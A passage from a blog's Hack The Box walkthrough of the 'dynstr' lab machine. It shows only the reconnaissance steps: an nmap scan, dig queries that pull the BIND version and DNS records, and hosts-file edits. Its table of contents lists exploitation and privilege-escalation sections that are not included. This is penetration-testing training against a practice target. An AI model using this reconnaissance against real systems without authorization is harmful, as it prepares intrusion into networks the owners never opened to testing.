<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="introduceOS:	 LinuxDifficulty:	MediumPoints:	30Release:	12 Jun 2021IP:	10.10.10.244">
<meta property="og:type" content="article">
<meta property="og:title" content="Hack-The-Box-walkthrough[dynstr]">
<meta property="og:url" content="https://fdlucifer.github.io/2021/06/14/dynstr/index.html">
<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	MediumPoints:	30Release:	12 Jun 2021IP:	10.10.10.244">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2000.jpg">
<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2001.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2002.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2003.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2004.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2005.jpg">
<meta property="article:published_time" content="2021-06-13T18:17:28.000Z">
<meta property="article:modified_time" content="2021-10-17T02:25:13.717Z">
<meta property="article:author" content="lUc1f3r11">
<meta property="article:tag" content="HackTheBox靶机练习">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2000.jpg">


<link rel="canonical" href="https://fdlucifer.github.io/2021/06/14/dynstr/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/06/14/dynstr/","path":"2021/06/14/dynstr/","title":"Hack-The-Box-walkthrough[dynstr]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hack-The-Box-walkthrough[dynstr] | lUc1f3r11's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="lUc1f3r11's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">lUc1f3r11's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Enumeration"><span class="nav-number"></span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Ports"><span class="nav-number"></span> <span class="nav-text">Ports</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NMAP"><span class="nav-number"></span> <span class="nav-text">NMAP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS-Enumeration"><span class="nav-number"></span> <span class="nav-text">DNS Enumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Enumeration"><span class="nav-number"></span> <span class="nav-text">Web Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Directory-Fuzzing"><span class="nav-number">1.</span> <span class="nav-text">Directory Fuzzing</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploitation"><span class="nav-number"></span> <span class="nav-text">Exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Don%E2%80%99t-forget-to-spin-up-listener-on-that-port"><span class="nav-number"></span> <span class="nav-text">Don’t forget to spin up listener on that port.</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WWW-Data-to-bindmgr"><span class="nav-number"></span> <span class="nav-text">WWW-Data to bindmgr</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration-1"><span class="nav-number"></span> <span class="nav-text">Enumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploitation-1"><span class="nav-number"></span> <span class="nav-text">Exploitation</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PrivESC"><span class="nav-number"></span> <span class="nav-text">PrivESC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration-2"><span class="nav-number"></span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-l"><span class="nav-number">1.</span> <span class="nav-text">sudo -l</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">2.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Contact-me"><span class="nav-number">3.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">203</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">32</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/06/14/dynstr/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="lUc1f3r11">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lUc1f3r11's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Hack-The-Box-walkthrough[dynstr] | lUc1f3r11's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Hack-The-Box-walkthrough[dynstr]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-06-14 02:17:28" itemprop="dateCreated datePublished" datetime="2021-06-14T02:17:28+08:00">2021-06-14</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2021-10-17 10:25:13" itemprop="dateModified" datetime="2021-10-17T10:25:13+08:00">2021-10-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>3.8k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>14 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:	 Linux<br>Difficulty:	Medium<br>Points:	30<br>Release:	12 Jun 2021<br>IP:	10.10.10.244</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2000.jpg"></p>
</li>
<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
</li>
</ul>
<span id="more"></span>

<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="Ports"><a href="#Ports" class="headerlink" title="Ports"></a>Ports</h2><table>
<thead>
<tr>
<th>Ports</th>
<th>service</th>
<th>version</th>
</tr>
</thead>
<tbody><tr>
<td>22</td>
<td>SSH</td>
<td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.2</td>
</tr>
<tr>
<td>53</td>
<td>DNS</td>
<td>ISC BIND 9.16.1 (Ubuntu Linux)</td>
</tr>
<tr>
<td>80</td>
<td>HTTP</td>
<td>Apache httpd 2.4.41</td>
</tr>
</tbody></table>
<h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.91 scan initiated Sun Jun 13 04:53:49 2021 as: nmap -vvv -p 22,53,80 -A -v -oN intial.nmap 10.10.10.244</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> dynstr.htb (10.10.10.244)</span><br><span class="line">Host is up, received syn-ack (0.16s latency).</span><br><span class="line">Scanned at 2021-06-13 04:53:51 BST <span class="keyword">for</span> 16s</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE REASON  VERSION</span><br><span class="line">22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)</span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC//sbOTQwLRH4CGj3riDnnTvTCiJT1Uz7CyRSD2Tkh2wkT20rtAq13c5M1LC2kxki2bz9Ptxxx340Cc9tAcQaPZbmHndQe/H1bGiVZCKjOl2WqWQTV9fq6GGtflC94BkkLrmkWHzqg+S50g2Zg0iesPMkKAmwqwEVZx9npe1QuF3RQu5EYQXRYVOzpqQdU+jRD267gCvsKp9xmr7trZ1UzFxfBUOzSCWa3Adm2TTFwiA5jTb6x0lKVnQtgKghioMQeXXPuiTLCbI0XfbksoRI2OBAvTZf7RsIthKCiyCQRWjVh5Idr5Fh7GgwYaDgW662W3V3hCNEQRY8R9/fXWdVho1gWbm6NFt+NyRO/6F2XDvPseBYr+Yi6zwGEM+PpsTi5dfj8yYKRZ3HFXwjeBGjCPMRe9XPpCvvDnHAF18B1INVJPSwAIVll365V5D18JslQh7PpAWxO70TzmEC9E+UPXOrt29tZ0Zi/uApFRM700pdOhnvcs8q4RBWaUpp3ZB0=</span><br><span class="line">|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFtYzp8umMbm7o9+1LUTVio/dduowE/AsA3rO52A5Q/Cuct9GY6IZEvPE+/XpEiNCPMSl991kjHT+WaAunmTbT4=</span><br><span class="line">|   256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOz8b9MDlSPP5QJgSHy6fpG98bdKCgvqhuu07v5NFkdx</span><br><span class="line">53/tcp open  domain  syn-ack ISC BIND 9.16.1 (Ubuntu Linux)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.16.1-Ubuntu</span><br><span class="line">80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Dyna DNS</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Sun Jun 13 04:54:07 2021 -- 1 IP address (1 host up) scanned in 18.86 seconds</span></span><br></pre></td></tr></table></figure>

<h2 id="DNS-Enumeration"><a href="#DNS-Enumeration" class="headerlink" title="DNS Enumeration"></a>DNS Enumeration</h2><p>For this part I reffered to one of my favourite website for refference <span class="exturl" data-url="aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L3BlbnRlc3RpbmcvcGVudGVzdGluZy1kbnM=">https://book.hacktricks.xyz/pentesting/pentesting-dns<i class="fa fa-external-link-alt"></i></span><br>Let’s get the banner for the DNS version</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/dynstr]</span><br><span class="line">└─<span class="comment"># dig version.bind CHAOS TXT @dyna.htb</span></span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.16.13-Debian &lt;&lt;&gt;&gt; version.bind CHAOS TXT @dyna.htb</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- <span class="string">opcode: QUERY, status: NOERROR, id: 61304</span></span><br><span class="line"><span class="string">;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span></span><br><span class="line"><span class="string">;; WARNING: recursion requested but not available</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">;; OPT PSEUDOSECTION:</span></span><br><span class="line"><span class="string">; EDNS: version: 0, flags:; udp: 4096</span></span><br><span class="line"><span class="string">; COOKIE: 2c3040bb3d8e6c5b0100000060c6e3286e8c14a06e158e06 (good)</span></span><br><span class="line"><span class="string">;; QUESTION SECTION:</span></span><br><span class="line"><span class="string">;version.bind.                  CH      TXT</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">;; ANSWER SECTION:</span></span><br><span class="line"><span class="string">version.bind.           0       CH      TXT     &quot;9.16.1-Ubuntu&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">;; Query time: 332 msec</span></span><br><span class="line"><span class="string">;; SERVER: 10.10.10.244#53(10.10.10.244)</span></span><br><span class="line"><span class="string">;; WHEN: 一 6月 14 01:01:42 EDT 2021</span></span><br><span class="line"><span class="string">;; MSG SIZE  rcvd: 95</span></span><br></pre></td></tr></table></figure>

<p>Looking at almost any record that is publicly available we find some subdomains</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/dynstr]</span><br><span class="line">└─<span class="comment"># dig ANY @10.10.10.244 dyna.htb</span></span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.16.13-Debian &lt;&lt;&gt;&gt; ANY @10.10.10.244 dyna.htb</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- <span class="string">opcode: QUERY, status: NOERROR, id: 43818</span></span><br><span class="line"><span class="string">;; flags: qr aa rd; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 2</span></span><br><span class="line"><span class="string">;; WARNING: recursion requested but not available</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">;; OPT PSEUDOSECTION:</span></span><br><span class="line"><span class="string">; EDNS: version: 0, flags:; udp: 4096</span></span><br><span class="line"><span class="string">; COOKIE: 41dc2957b1ff99420100000060c6e373bcf7cb1343550555 (good)</span></span><br><span class="line"><span class="string">;; QUESTION SECTION:</span></span><br><span class="line"><span class="string">;dyna.htb.                      IN      ANY</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">;; ANSWER SECTION:</span></span><br><span class="line"><span class="string">dyna.htb.               60      IN      SOA     dns1.dyna.htb. hostmaster.dyna.htb. 2021030305 21600 3600 604800 60</span></span><br><span class="line"><span class="string">dyna.htb.               60      IN      NS      dns1.dyna.htb.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">;; ADDITIONAL SECTION:</span></span><br><span class="line"><span class="string">dns1.dyna.htb.          60      IN      A       127.0.0.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">;; Query time: 324 msec</span></span><br><span class="line"><span class="string">;; SERVER: 10.10.10.244#53(10.10.10.244)</span></span><br><span class="line"><span class="string">;; WHEN: 一 6月 14 01:02:57 EDT 2021</span></span><br><span class="line"><span class="string">;; MSG SIZE  rcvd: 147</span></span><br></pre></td></tr></table></figure>

<p>let’s add those to &#x2F;etc&#x2F;hosts</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">echo</span> <span class="string">&quot;10.10.10.244  dns1.dyna.htb hostmaster.dyna.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>visiting the subdomains doesn’t do you any good. it’s the same website so let’s move on.</p>
<h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>visiting the website we can see the potential dns name for the host.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2001.jpg"></li>
</ul>
<p>At the very bottom of the page we can see there is the email to contact with the domain dyna.htb so let’s add it in &#x2F;etc&#x2F;hosts</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">echo</span> <span class="string">&quot;10.10.10.244  dyna.htb&quot;</span> &gt;&gt; /etc/hosts </span><br></pre></td></tr></table></figure>

<p>let’s visit the page nothing changed.</p>
